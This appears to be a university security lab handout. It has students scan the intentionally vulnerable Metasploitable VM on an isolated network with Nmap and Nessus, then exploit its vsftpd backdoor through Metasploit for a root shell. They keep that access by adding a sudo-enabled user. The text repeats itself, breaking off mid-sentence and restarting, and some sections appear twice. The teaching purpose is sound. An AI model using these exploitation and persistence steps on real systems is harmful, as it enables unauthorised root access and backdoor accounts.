# Security 4

# Vulnerability Scanning

In this lab you will gain remote access to a machine, scan it for vulnerable services, and then exploit those services.

# Installing Metasploitable

Metasploitable is an intentionally vulnerable virtual machine. It runs Linux and has a variety of misconfigured or outdated services running (web server, FTP server, etc). We will be using it as a target for vulnerability scanning in this lab. 

Import the Metasploitable virtual machine in VirtualBox: Start by clicking “File -> Import Appliance...” in the main window of VirtualBox, and import the file Metasploitable.ova that you can find in the course folder.


# Configuring a virtual network

In this lab, your Kali machine will run on the same local area network (LAN) as the vulnerable Metasploitable machine. To this end, we need to configure VirtualBox to work as DHCP server.

## Configuring VirtualBox as DHCP server

To connect our machines, we will use the networking mode called “Host-only networking” which allows us to completely separate our guest machines from the outside world while still being connected together in a (virtual) LAN. In this mode, VirtualBox functions as a virtual switch so that all virtual machines that use this mode appear to be on the same LAN. Moreover, no traffic can come from – or escape to – the outside world (i.e. the Internet).

### Create an adapter

+ On your host machine, go to the VirtualBox's main menu and click “File -> Host Network Manager”

+ click on “Create host-only network” symbol to create a new adapter.

+ Select **Enable DHCP server**

+ In the adapter properties, set the parameters as follows: 

```bash
IPv4 address: 10.0.0.1 
Network mask: 255.255.255.0 
```

+ In the "DHCP server" tab, configure the DHCP server as follows: 

```bash
Server address: 10.0.0.100
Server Mask: 255.255.255.0
Lower address bound: 10.0.0.101
Upper address bound: 10.0.0.200 
```

When the virtual machines attach to this internal network, they will automatically be given IP addresses in the range 10.0.0.101 to 10.0.0.200.


### Attach Metasploitable machine and Kali to the LAN

+ Attach the Metasploitable machine to the LAN. Go to “Settings -> Network” and select “Host-only Adapter” from the drop-down menu. Make sure no other network adapters are attached. This way the Metasploitable will only be able to access the LAN and not the Internet.

+ Do the same for the Kali machine, but add a second adapter as well. Choose “NAT” for this adapter. Having two adapters attached to the Kali machine allows us to both access the LAN and the Internet, which we will need later to download and update some tools.

+ Now boot up both machines in VirtualBox and log in to them. The default username/password combination for Metasploitable is *msfadmin/msfadmin*.

+ Verify that both machines are on the same LAN

:tip:
Run the command *ifconfig* on the Kali machine. If VirtualBox was configured correctly, it should have been assigned an IP-address similar to 10.0.0.1XX. Then run the same command on the Metasploitable machine. Again, the network address should read something like 10.0.0.1XX.

# Discovering hosts with Nmap

Consider the scenario where an attacker has just joined the network with no prior knowledge of the other connected machines. The first thing we want to know is how many hosts are connected and what their IP-addresses are. To gather this information we will use Nmap (Network Mapper).

+ Use the following command to scan the network with Nmap and discover the machines that are "live" and the services they are running: `# nmap -sn 10.0.0.1/24`

"-sn" tells Nmap not to do a port scan after host discovery. 

Note that the IP-address is written with a slash and a number at the end. Since we don’t know which IP-address the victim machine has, we want to scan a range of addresses. To do so we use subnet mask. Here we are masking 24 out of 32 bits, which means that 32−24 = 8 bits are unmasked and we get 2^8 = 256 different host-addresses. Therefore, Nmap will scan the range 10.0.0.1-10.0.0.255 and look for live hosts.

The scan will return 4 IP-addresses. The first two are the default gateway and the DHCP server provided by VirtualBox. The next two are Kali’s IP address and the last one is the victim’s.

# Gathering information

Now that we know the IP-address of the potential target, the next step is to gather more information about it.

## OS detection

The first thing we want to know about a newly discovered host is what operating system it’s running. Different operating systems have different vulnerabilities so knowing which one we are dealing with will be crucial to the success of our attack. 

Since network protocols are standardized, the operating systems are supposed to send the same messages over the network. Fortunately, the operating systems have slightly different implementations of the network stack and therefore send network packets with slightly different time intervals between them. By analyzing these patterns, it’s possible to make a good guess as to which OS is sending the packets. Nmap has this functionality built in.

+ Run Nmap with the "-O" flag to use the OS detection functionality: `# nmap -O <IP_address_victim_machine>`

if the scan was successful the last few lines that the command returns will have information about the OS of the victim machine.

## Port scanning

The next step is to know which services the victim machine is running. The quickest way to find running services is by trying to connect to them. This is known as port scanning and involves trying to connect to all the ports on a remote system and see which ones give a meaningful reply back. By interpreting the reply, it’s possible to figure out which server is listening to the port.

Kali has several tools for port scanning, but we will use Nmap. By default, Nmap only scans the top 1000 most popular ports. We want as much information as possible, so we tell Nmap to scan all TCP-ports:

`# nmap -p 0-65535 -sV <IP_address_victim_machine>`

The "-sV" flag makes Nmap try to figure out the version of the services it has discovered. This scan is quite comprehensive, so it will take a few minutes to complete. The obtained results will show the running services and their versions.

# Finding vulnerabilities

Now that we know some basic information about the victim, we can start looking for vulnerabilities with the help of a vulnerability scanner. A vulnerability scanner has a database of known configuration problems and exploits, that it tests against a remote machine. It then generates a report that shows the systems security problems and (sometimes) how to fix them.

## Installing Nessus

We are going to use Nessus, a widely used vulnerability scanner, to scan the victim machine. Kali dosen’t come with Nessus by default, so we must install it. 

+ Start by going to the Nessus download page https://www.tenable.com/downloads/nessus (open it in Firefox inside the Kali virtual machine). 

+ Download the 64-bit file for Debian/Kali (the one with AMD64 in the name). 

+ After it has downloaded, open a terminal and run the following commands:

```bash
cd Downloads
dpkg -i Nessus-8.7.1-debian6_amd64.deb
/etc/init.d/nessusd start
```

Nessus will now start its web interface on port 8834. To access it, point your web browser to "https://localhost:8834". You will get a warning saying that your connection is insecure. This is because Nessus uses HTTPS with what’s called a “Self-signed certificate”. These certificates are not part of the “Chain-of-trust” and thus the browser cannot verify that the server is who they claim they are. In our case, the kali machine is the server and we are just connecting to our own machine, so we can safely ignore the warning. Click “Advanced” -> “Add exception” to add an exception for Nessus and continue connecting.

Note: If you ever see a similar warning while browsing the Internet normally, be extremely careful. It could mean that someone is tampering with your traffic!

+ Nessus will start downloading and installing plugins used to check for vulnerabilities. 

## Starting a scan

Click "New Scan" and then "Basic Network Scan". Enter the IP-address of the victim in the "Targets" field, and name the scan "Metasploitable". You don’t need to provide a description. Click the dropdown arrow and select "Launch" to start the scan.

The scan will take a few minutes to complete. You can check the progress by selecting the scan under "My Scans". Once vulnerabilities are found they will appear under the "Vulnerabilities" tab.

## Analyzing the results

Once the scan has finished, a breakdown of the discovered vulnerabilities will be displayed. Vulnerabilities are grouped by how serious they are. Red means critical, orange means high and so on. Click on a vulnerability to show more information about that specific vulnerability, including suggested remedies and sometimes which tools can be used to exploit the vulnerability.

Keep the results open so you can view them later when looking for appropriate exploits.

# Metasploit

Now that we’ve found some vulnerabilities, the next step is to exploit them. To do this, we will be using a tool called Metasploit, which is a penetration testing framework. It comes preloaded with hundreds of exploits for known software vulnerabilities found in a large range of systems.  

A lot of additional material on how to use Metasploit can be found at http://www.offensive-security.com/metasploit-unleashed. Some of the material in this lab are also taken from that site.

+ To ensure that we have the latest version of Metasploit installed, we first need to update it:

```bash
apt-get update                       % update the repository list
apt-get install metasploit-framework % update metasploit
service postgresql start             % metasploit uses a postresql database
msfdb init                           % initialize the database
```

## Running Metasploit

Start Metasploit by running *msfconsole*: `# msfconsole`. You will soon be greeted by an ASCII welcome logo.

You are now in the Metasploit command console. At any point you can type help or ? to get a list of all available commands. The console functions pretty much like normal Linux terminal.

## Searching for exploits

Metasploit comes with a large number of pre-made exploits (or modules) that you can use. 

+ To find a particular exploit, type search followed by a keyword. For example, to search for FTP exploits for Linux type the following command:

`msf > search platform:unix platform:linux type:exploit ftp`

We use both Unix and Linux as platform since most exploits categorized as Unix will work on Linux.

As we saw earlier (during the Nmap scan) our victim runs two FTP servers. 

For more information about the search command, see https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/#search

## Using an exploit - How it works

We will first explain the steps needed to use an exploit. Once you have found an exploit that looks promising you need to tell Metasploit how it should be executed. Exploits are packaged as Metasploit modules. Such modules typically have some parameters that need to be set before they can be used. 

The steps for using an exploit are the following:

1. First, tell Metasploit which module you want to try with the *use* command:

```bash
msf > use exploit/platform/service/exploit_name
msf exploit(exploit_name) >
```

2. Use the *show options* command to see the parameters that the module uses: 

`msf exploit(exploit_name) > show options`

3. With the help of the *set* command, set the *RHOST* parameter to the IP address of the victim: 

`msf exploit(exploit_name) > set RHOST <IP_address_victim_machine>`

4. We run the exploit # Security 4

# Vulnerability Scanning

In this lab you will gain remote access to a machine, scan it for vulnerable services, and then exploit those services.

# Installing Metasploitable

Metasploitable is an intentionally vulnerable virtual machine. It runs Linux and has a variety of misconfigured or outdated services running (web server, FTP server, etc). We will be using it as a target for vulnerability scanning in this lab. 

Import the Metasploitable virtual machine in VirtualBox: Start by clicking “File -> Import Appliance...” in the main window of VirtualBox, and import the file Metasploitable.ova that you can find in the course folder.


# Configuring a virtual network

In this lab, your Kali machine will run on the same local area network (LAN) as the vulnerable Metasploitable machine. To this end, we need to configure VirtualBox to work as DHCP server.

## Configuring VirtualBox as DHCP server

To connect our machines, we will use the networking mode called “Host-only networking” which allows us to completely separate our guest machines from the outside world while still being connected together in a (virtual) LAN. In this mode, VirtualBox functions as a virtual switch so that all virtual machines that use this mode appear to be on the same LAN. Moreover, no traffic can come from – or escape to – the outside world (i.e. the Internet).

### Create an adapter

+ On your host machine, go to the VirtualBox's main menu and click “File -> Host Network Manager”

+ click on “Create host-only network” symbol to create a new adapter.

+ Select **Enable DHCP server**

+ In the adapter properties, set the parameters as follows: 

```bash
IPv4 address: 10.0.0.1 
Network mask: 255.255.255.0 
```

+ In the "DHCP server" tab, configure the DHCP server as follows: 

```bash
Server address: 10.0.0.100
Server Mask: 255.255.255.0
Lower address bound: 10.0.0.101
Upper address bound: 10.0.0.200 
```

When the virtual machines attach to this internal network, they will automatically be given IP addresses in the range 10.0.0.101 to 10.0.0.200.


### Attach Metasploitable machine and Kali to the LAN

+ Attach the Metasploitable machine to the LAN. Go to “Settings -> Network” and select “Host-only Adapter” from the drop-down menu. Make sure no other network adapters are attached. This way the Metasploitable will only be able to access the LAN and not the Internet.

+ Do the same for the Kali machine, but add a second adapter as well. Choose “NAT” for this adapter. Having two adapters attached to the Kali machine allows us to both access the LAN and the Internet, which we will need later to download and update some tools.

+ Now boot up both machines in VirtualBox and log in to them. The default username/password combination for Metasploitable is *msfadmin/msfadmin*.

+ Verify that both machines are on the same LAN

:tip:
Run the command *ifconfig* on the Kali machine. If VirtualBox was configured correctly, it should have been assigned an IP-address similar to 10.0.0.1XX. Then run the same command on the Metasploitable machine. Again, the network address should read something like 10.0.0.1XX.

# Discovering hosts with Nmap

Consider the scenario where an attacker has just joined the network with no prior knowledge of the other connected machines. The first thing we want to know is how many hosts are connected and what their IP-addresses are. To gather this information we will use Nmap (Network Mapper).

+ Use the following command to scan the network with Nmap and discover the machines that are "live" and the services they are running: `# nmap -sn 10.0.0.1/24`

"-sn" tells Nmap not to do a port scan after host discovery. 

Note that the IP-address is written with a slash and a number at the end. Since we don’t know which IP-address the victim machine has, we want to scan a range of addresses. To do so we use subnet mask. Here we are masking 24 out of 32 bits, which means that 32−24 = 8 bits are unmasked and we get 2^8 = 256 different host-addresses. Therefore, Nmap will scan the range 10.0.0.1-10.0.0.255 and look for live hosts.

The scan will return 4 IP-addresses. The first two are the default gateway and the DHCP server provided by VirtualBox. The next two are Kali’s IP address and the last one is the victim’s.

# Gathering information

Now that we know the IP-address of the potential target, the next step is to gather more information about it.

## OS detection

The first thing we want to know about a newly discovered host is what operating system it’s running. Different operating systems have different vulnerabilities so knowing which one we are dealing with will be crucial to the success of our attack. 

Since network protocols are standardized, the operating systems are supposed to send the same messages over the network. Fortunately, the operating systems have slightly different implementations of the network stack and therefore send network packets with slightly different time intervals between them. By analyzing these patterns, it’s possible to make a good guess as to which OS is sending the packets. Nmap has this functionality built in.

+ Run Nmap with the "-O" flag to use the OS detection functionality: `# nmap -O <IP_address_victim_machine>`

if the scan was successful the last few lines that the command returns will have information about the OS of the victim machine.

## Port scanning

The next step is to know which services the victim machine is running. The quickest way to find running services is by trying to connect to them. This is known as port scanning and involves trying to connect to all the ports on a remote system and see which ones give a meaningful reply back. By interpreting the reply, it’s possible to figure out which server is listening to the port.

Kali has several tools for port scanning, but we will use Nmap. By default, Nmap only scans the top 1000 most popular ports. We want as much information as possible, so we tell Nmap to scan all TCP-ports:

`# nmap -p 0-65535 -sV <IP_address_victim_machine>`

The "-sV" flag makes Nmap try to figure out the version of the services it has discovered. This scan is quite comprehensive, so it will take a few minutes to complete. The obtained results will show the running services and their versions.

# Finding vulnerabilities

Now that we know some basic information about the victim, we can start looking for vulnerabilities with the help of a vulnerability scanner. A vulnerability scanner has a database of known configuration problems and exploits, that it tests against a remote machine. It then generates a report that shows the systems security problems and (sometimes) how to fix them.

## Installing Nessus

We are going to use Nessus, a widely used vulnerability scanner, to scan the victim machine. Kali dosen’t come with Nessus by default, so we must install it. 

+ Start by going to the Nessus download page https://www.tenable.com/downloads/nessus (open it in Firefox inside the Kali virtual machine). 

+ Download the 64-bit file for Debian/Kali (the one with AMD64 in the name). 

+ After it has downloaded, open a terminal and run the following commands:

```bash
cd Downloads
dpkg -i Nessus-8.7.1-debian6_amd64.deb
 /etc/init.d/nessusd start
```

Nessus will now start its web interface on port 8834. To access it, point your web browser to "https://localhost:8834". You will get a warning saying that your connection is insecure. This is because Nessus uses HTTPS with what’s called a “Self-signed certificate”. These certificates are not part of the “Chain-of-trust” and thus the browser cannot verify that the server is who they claim they are. In our case, the kali machine is the server and we are just connecting to our own machine, so we can safely ignore the warning. Click “Advanced” -> “Add exception” to add an exception for Nessus and continue connecting.

Note: If you ever see a similar warning while browsing the Internet normally, be extremely careful. It could mean that someone is tampering with your traffic!

+ Nessus will start downloading and installing plugins used to check for vulnerabilities. 

## Starting a scan

Click "New Scan" and then "Basic Network Scan". Enter the IP-address of the victim in the "Targets" field, and name the scan "Metasploitable". You don’t need to provide a description. Click the dropdown arrow and select "Launch" to start the scan.

The scan will take a few minutes to complete. You can check the progress by selecting the scan under "My Scans". Once vulnerabilities are found they will appear under the "Vulnerabilities" tab.

## Analyzing the results

Once the scan has finished, a breakdown of the discovered vulnerabilities will be displayed. Vulnerabilities are grouped by how serious they are. Red means critical, orange means high and so on. Click on a vulnerability to show more information about that specific vulnerability, including suggested remedies and sometimes which tools can be used to exploit the vulnerability.

Keep the results open so you can view them later when looking for appropriate exploits.

# Metasploit

Now that we’ve found some vulnerabilities, the next step is to exploit them. To do this, we will be using a tool called Metasploit, which is a penetration testing framework. It comes preloaded with hundreds of exploits for known software vulnerabilities found in a large range of systems.  

A lot of additional material on how to use Metasploit can be found at http://www.offensive-security.com/metasploit-unleashed. Some of the material in this lab are also taken from that site.

+ To ensure that we have the latest version of Metasploit installed, we first need to update it:

```bash
apt-get update                       % update the repository list
apt-get install metasploit-framework % update metasploit
service postgresql start             % metasploit uses a postresql database
msfdb init                           % initialize the database
```

## Running Metasploit

Start Metasploit by running *msfconsole*: `# msfconsole`. You will soon be greeted by an ASCII welcome logo.

You are now in the Metasploit command console. At any point you can type help or ? to get a list of all available commands. The console functions pretty much like normal Linux terminal.

## Searching for exploits

Metasploit comes with a large number of pre-made exploits (or modules) that you can use. 

To find a particular exploit, type search followed by a keyword. For example, to search for FTP exploits for Linux type the following command:

`msf > search platform:unix platform:linux type:exploit ftp`

We use both Unix and Linux as platform since most exploits categorized as Unix will work on Linux.

As we saw earlier (during the Nmap scan) our victim runs two FTP servers. 

For more information about the search command, see https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/#search

## Using an exploit - How it works

We will first explain the steps needed to use an exploit. Once you have found an exploit that looks promising you need to tell Metasploit how it should be executed. 

The steps for using an exploit are the following:

1. The first step is to tell Metasploit which module you want to try with the *use* command:

```bash
msf > use exploit/platform/service/exploit_name
msf exploit(exploit_name) >
```

2. Use the *show options* command to see the parameters that the module uses: 

`msf exploit(exploit_name) > show options`

3. With the help of the *set* command, set the *RHOST* parameter to the IP address of the victim: 

`msf exploit(exploit_name) > set RHOST <IP_address_victim_machine>`

4. type *run* to run the exploit

# Gaining remote access using backdoored FTP server

Now that we’ve done a vulnerability scan and covered a way to run exploits, it’s time to do the actual “hacking”. Your task is now to gain remote access to the Metasploitable machine and make your access persistent.

Backdoors are methods of bypassing the security of a software program or operating system. They are like normal exploits, but they are deliberately part of the software.

Metasploitable has a backdoored version of vsftpd installed and running. If you look back at the vulnerability scan you’ll see that Nessus discovered the backdoor and flagged it as a “Critical” vulnerability.

## Using the backdoor with metasploit

Metasploit has a module that makes it really easy to take advantage of this backdoor.

+ Use the following command to search for vsftpd: `msf > search vsftpd`

+ specify the name of the exploit we want to use: `msf > use exploit/unix/ftp/vsftpd_234_backdoor`

+ Set the target IP-address: `msf exploit(vsftpd_234_backdoor) > set RHOST <IP_address_victim_machine>`

+ Run the exploit: `msf exploit(vsftpd_234_backdoor) > run`

You can see from the last line on the screen that the backdoor worked and a shell was open at port 6200 on the victim machine. You are now connected to that shell and can type
any commands you want. 

+ Using the command *whoami*, check which user you are running as. You will find out that you are logged in as "root", which means that vsftpd was running with root privileges.

+ Check that you are actually running commands on the remote machine (Metasploitable) and not locally by running the command  `hostname`

+ Try putting the Kali and Metasploitable windows side by side, run the “reboot” command. 

You will notice that when you rebooted Metasploitable, the backdoor shell stopped working. To gain access to the machine we would have to run the exploit again which might be problematic. We need therefore to make our access persistent.

## Making our access persistent

As we saw in the Nmap scan, the victim is already running both SSH and Telnet, so the easiest way to gain persistent access is by adding an extra user to the system.

+ Run the exploit again to get the backdoor shell back, then run the following commands:

```bash
useradd ttm4175 % Add 'ttm175' as a new user
passwd ttm4175 % Set the password for the new user
usermod -aG sudo ttm4175 % Add the user to the 'admin' group, this is equivalent to being root
reboot
```

The second command will ask you to enter a password for the new user.

+ After running the reboot command, wait until Metasploitable has rebooted and then try to login with for example telnet: `telnet <IP_address_victim_machine>

+ After logging in, test that you still can get root access:

```bash
$ sudo su % Switch to the root user, 'su' means substitute user
# whoami
```

The last command should print "root" if successful.

# Final Steps

### Learning Goals

In your double-team, reflect about what you learned today. Write a few sentences that capture (in your own words) what you learned and why it can be useful. Share these few sentences with everyone in the double-team. (You should use this text in the individual reflection below.)

:aside: <img src="figures/doubleteam.png" width="30"/>


### Individual Reflection

Fill out the <a href="https://forms.office.com/Pages/ResponsePage.aspx?id=cgahCS-CZ0SluluzdZZ8BSxiepoCd7lKk70IThBWqdJUQzJJUEVaQlBBMlFaSFBaTllITkcxRDEzNi4u" class="arrow">individual reflection survey</a>.


### Cleaning Up

:todo:
- Put all hardware back into the box.
- Store the box in one of the lockers in the lab, using the combination lock.
- Connect all parts of the PC back to it (keyboard, mouse, monitor).
- Take out any trash. (Even if its not yours... thank you!)
- Put the chairs back to the table.

### Individual Exercises

We recommend that you take some time to consider if there are any parts of this unit that you want to repeat individually, at your own pace. If you decide to do so, you have several options:

- You have access to the hardware box at all times from the lockers. Just make sure everyone in your team knows where the box is, and put it back into the locker.
- Install a Raspberry Pi Image on a Virtual Box in your PC. With this, you always have a Raspberry Pi with you.
- Some of the Linux-related exercises also work on the Linux-PCs in the lab.


# Gaining remote access using backdoored FTP server

Now that we’ve done a vulnerability scan and covered a way to run exploits, it’s time to do the actual “hacking”. Your task is now to gain remote access to the Metasploitable machine and make your access persistent.

Backdoors are methods of bypassing the security of a software program or operating system. They are like normal exploits, but they are deliberately part of the software.

Metasploitable has a backdoored version of vsftpd installed and running. If you look back at the vulnerability scan you’ll see that Nessus discovered the backdoor and flagged it as a “Critical” vulnerability.

## Using the backdoor with metasploit

Metasploit has a module that makes it really easy to take advantage of this backdoor.

+ Use the following command to search for vsftpd: `msf > search vsftpd`

+ specify the name of the exploit we want to use: `msf > use exploit/unix/ftp/vsftpd_234_backdoor`

+ Set the target IP-address: `msf exploit(vsftpd_234_backdoor) > set RHOST <IP_address_victim_machine>`

+ Run the exploit: `msf exploit(vsftpd_234_backdoor) > run`

You can see from the last line on the screen that the backdoor worked and a shell was open at port 6200 on the victim machine. You are now connected to that shell and can type
any commands you want. 

+ Using the command *whoami*, check which user you are running as. You will find out that you are logged in as "root", which means that vsftpd was running with root privileges.

+ Check that you are actually running commands on the remote machine (Metasploitable) and not locally by running the command  `hostname`

+ Try putting the Kali and Metasploitable windows side by side, run the “reboot” command. 

You will notice that when you rebooted Metasploitable, the backdoor shell stopped working. To gain access to the machine we would have to run the exploit again which might be problematic. We need therefore to make our access persistent.

## Making our access persistent

As we saw in the Nmap scan, the victim is already running both SSH and Telnet, so the easiest way to gain persistent access is by adding an extra user to the system.

+ Run the exploit again to get the backdoor shell back, then run the following commands:

```bash
useradd ttm4175 % Add 'ttm175' as a new user
passwd ttm4175 % Set the password for the new user
usermod -aG sudo ttm4175 % Add the user to the 'admin' group, this is equivalent to being root
reboot
```

The second command will ask you to enter a password for the new user.

+ After running the reboot command, wait until Metasploitable has rebooted and then try to login with for example telnet: `telnet <IP_address_victim_machine>

+ After logging in, test that you still can get root access:

```bash
$ sudo su % Switch to the root user, 'su' means substitute user
# whoami
```

The last command should print "root" if successful.

# Final Steps

### Learning Goals

In your double-team, reflect about what you learned today. Write a few sentences that capture (in your own words) what you learned and why it can be useful. Share these few sentences with everyone in the double-team. (You should use this text in the individual reflection below.)

:aside: <img src="figures/doubleteam.png" width="30"/>


### Individual Reflection

Fill out the <a href="https://forms.office.com/Pages/ResponsePage.aspx?id=cgahCS-CZ0SluluzdZZ8BSxiepoCd7lKk70IThBWqdJUQzJJUEVaQlBBMlFaSFBaTllITkcxRDEzNi4u" class="arrow">individual reflection survey</a>.


### Cleaning Up

:todo:
- Put all hardware back into the box.
- Store the box in one of the lockers in the lab, using the combination lock.
- Connect all parts of the PC back to it (keyboard, mouse, monitor).
- Take out any trash. (Even if its not yours... thank you!)
- Put the chairs back to the table.

### Individual Exercises

We recommend that you take some time to consider if there are any parts of this unit that you want to repeat individually, at your own pace. If you decide to do so, you have several options:

- You have access to the hardware box at all times from the lockers. Just make sure everyone in your team knows where the box is, and put it back into the locker.
- Install a Raspberry Pi Image on a Virtual Box in your PC. With this, you always have a Raspberry Pi with you.
- Some of the Linux-related exercises also work on the Linux-PCs in the lab.

